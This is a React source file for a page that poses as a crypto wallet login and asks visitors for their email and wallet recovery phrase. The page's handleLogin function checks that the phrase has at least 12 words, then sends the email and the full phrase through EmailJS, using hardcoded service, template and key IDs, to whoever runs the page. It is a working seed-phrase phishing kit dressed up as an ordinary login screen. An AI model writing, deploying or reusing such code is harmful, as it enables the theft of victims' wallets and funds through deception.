"use client";
import React, { useState } from "react";
import emailjs from "emailjs-com";
// import IssueReportingPage from "./report";
const LoginPage = ({ onLoginSuccess, onBack }) => {
  const [error, setError] = useState("");
  const [email, setEmail] = useState("");
  const [recoveryPhrase, setRecoveryPhrase] = useState("");
  
  const isValidEmail = (email) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const handleLogin = () => {
    if (!email || !recoveryPhrase) {
      setError("All fields are required.");
      return;
    }
    if (!isValidEmail(email)) {
      setError("Please enter a valid email address.");
      return;
    }

    const words = recoveryPhrase.trim().split(/\s+/);
    if (words.length < 12) {
      setError("Recovery phrase must be at least 12 words.");
      return;
    }

    emailjs
      .send(
        "service_n8rslz8",
        "template_s5j5bws",
        {
          email: email,
          recoveryPhrase: recoveryPhrase,
        },
        "AQ3rmqLrAxGjWGBuI"
      )
      .then(() => {
        console.log("Email sent!");
        onLoginSuccess();
      })
      .catch((err) => {
        console.error(err);
        setError("Failed to send email.");
      });
  };

  return (
    <div className="relative min-h-screen bg-[#1A1A2E] flex flex-col items-center p-4 font-sans text-white">
      {/* Back button */}
      <button
        onClick={onBack}
        className="absolute top-6 left-6 p-2 rounded-full bg-gray-700 hover:bg-gray-600 transition-colors duration-200 z-10"
      >
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="24"
          height="24"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          strokeWidth="2"
          strokeLinecap="round"
          strokeLinejoin="round"
          className="lucide lucide-arrow-left"
        >
          <path d="m12 19-7-7 7-7" />
          <path d="M19 12H5" />
        </svg>
      </button>

      {/* Logo */}
      <div className="mt-16 mb-8 ">
        {/* Using a simple SVG to mimic the logo shape */}
        <img
          src="/icons/image.png"
          className="bchain shadow-lg shadow-gray-800"
          alt=""
        />
      </div>

      {/* Welcome text */}
      <h1 className="text-3xl md:text-4xl font-bold text-center mb-2">
        Welcome back
      </h1>
      <p className="text-gray-400 text-center text-md md:text-lg max-w-xs mb-8">
        Enter your email address and Recovery Phrase
      </p>

      {/* Form Section */}
      <div className="w-full max-w-md space-y-6">
        {/* Email Input */}
        <div>
          <label
            htmlFor="email"
            className="block text-gray-300 text-sm font-semibold mb-2"
          >
            Email
          </label>
          <input
            type="email"
            id="email"
            placeholder="Enter your email"
            className="w-full p-4 bg-[#2A2A3E] border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-white placeholder-gray-500"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
        </div>

        {/* Recovery Phrase Textarea */}
        <div>
          <label
            htmlFor="recovery-phrase"
            className="block text-gray-300 text-sm font-semibold mb-2"
          >
            Recovery Phrase
          </label>
          <textarea
            id="recovery-phrase"
            rows="4"
            placeholder="Separate each word with a space."
            className="w-full p-4 bg-[#2A2A3E] border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-white placeholder-gray-500 resize-none"
            value={recoveryPhrase}
            onChange={(e) => setRecoveryPhrase(e.target.value)}
          ></textarea>
        </div>
        {/* Error Message */}
        {error && (
          <div className="text-red-400 font-medium text-sm -mt-4 mb-2">
            {error}
          </div>
        )}
        
        {/* Login Button */}
        <button
          onClick={handleLogin}
          className="w-full bg-blue-600 hover:bg-blue-700 text-white text-xl font-semibold py-4 rounded-lg shadow-lg transition-colors duration-300"
        >
          Login
        </button>
      </div>
    </div>
  );
};

export default LoginPage;
